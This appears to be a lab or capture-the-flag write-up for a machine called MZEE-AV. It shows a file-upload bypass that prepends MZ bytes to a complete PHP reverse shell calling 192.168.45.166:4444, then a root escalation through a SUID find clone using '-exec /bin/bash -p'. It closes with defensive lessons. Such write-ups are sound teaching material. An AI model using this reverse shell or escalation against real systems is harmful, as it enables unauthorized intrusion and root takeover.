### Web App Behavior

![MZEE-AV upload page showing file submission and scan UI](/assets/img/pg/mzeeav/mzeeav-01.png)
*Caption: The target application exposes a file upload interface that claims to scan PE files.*

The upload logic relied on checking the first two bytes for `4D5A` (`MZ`) and did not properly validate extension, MIME type, or full file content.

💡 Why this works  
A two-byte magic check is not sufficient validation for executable vs script content. Attackers can prepend benign-looking bytes and still include server-side executable code. If the web server executes uploaded scripts, this leads directly to code execution.

## Initial Foothold

### Uploading an MZ-Prepended PHP Reverse Shell

```bash
printf '\x4D\x5A' > rev.php
cat >> rev.php << 'EOF'
<?php
set_time_limit(0);
$ip = '192.168.45.166';
$port = 4444;
$sock = fsockopen($ip, $port);
$descriptorspec = array(0 => $sock, 1 => $sock, 2 => $sock);
$process = proc_open('/bin/sh', $descriptorspec, $pipes);
proc_close($process);
?>
EOF
```

💡 Why this works  
PHP ignores non-PHP bytes before the `<?php` tag, so the prepended `MZ` bytes do not prevent execution. Once uploaded, a direct HTTP request triggers the payload. This combines file-type confusion with unsafe execution of uploaded content.

### Abusing SUID `find` Behavior (GTFOBins Mechanism)

```bash
www-data@mzeeav:/opt$ ./fileS . -exec /bin/bash -p \; -quit
bash-5.1#

```

```bash
bash-5.1# cat /root/proof.txt
31c145840f70f2874b049253e763e9ce

```

💡 Why this works  
`fileS` is effectively a SUID `find` clone. GTFOBins for `find` uses `-exec` to run commands, and `/bin/bash -p` preserves elevated privileges. Because the binary runs with effective root permissions, the spawned shell inherits root-level access.

## Lessons Learned / Key Takeaways

- Magic-byte-only validation is insufficient for secure file upload handling.
- Uploaded files must be stored outside executable web paths whenever possible.
- SUID binaries with command-execution features are high-risk and should be strictly controlled.
- Binary masquerading (`MZ` prefix) can bypass naive file-type checks.
- GTFOBins techniques remain highly effective when standard hardening is missing.
